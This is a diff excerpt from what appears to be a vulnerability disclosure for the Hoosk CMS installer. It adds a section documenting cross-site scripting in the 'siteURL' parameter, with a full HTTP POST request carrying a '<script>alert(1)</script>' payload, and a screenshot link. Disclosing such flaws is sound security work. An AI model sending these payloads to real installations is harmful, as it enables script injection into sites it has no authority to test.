@@ -89,9 +89,21 @@ siteName='<script>alert(1)</script>&siteURL=http%3A%2F%2Fa.com&dbName=hoosk&dbUs
 
 
 
+### 0x04 install xss
 
+Same as 0x03, param `siteURL` is vulnerable to xss:
 
+```
+POST /code-env/Hoosk-master/install/index.php HTTP/1.1
+Host: xxxx
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 129
 
+siteName=test&siteURL="<script>alert(1)</script>&dbName=hoosk&dbUserName=root&dbPass=123456&dbHost=localhost%3A3306
+```
 
-
+![image-20201012172109625](hoosk.assets/image-20201012172109625.png)
 
